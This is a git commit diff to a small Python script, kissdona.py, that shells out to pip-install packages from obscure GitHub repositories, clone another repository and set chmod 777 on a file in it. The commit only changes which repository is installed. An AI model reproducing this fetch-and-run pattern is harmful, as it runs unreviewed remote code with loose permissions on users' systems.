dd6244e6ddb718f7f34e8ac7a1ad3a7e74751ef6
lovedona <83457221+lovedona@users.noreply.github.com>
2021-05-14 21:25:22 +0530

    Update kissdona.py

--- kissdona.py
+++ kissdona.py
@@ -1,5 +1,5 @@
 import os
-os.system("pip3 install git+https://github.com/ostrich2121/shoot.git")
+os.system("pip3 install git+https://github.com/lovedona/monojjikonokrichahiye.git")
 os.system("git clone https://github.com/ostrich2121/taughter.git")
 os.system("chmod 777 taughter/slope.py")
 #os.system("python3 murgi/ram1.py &")
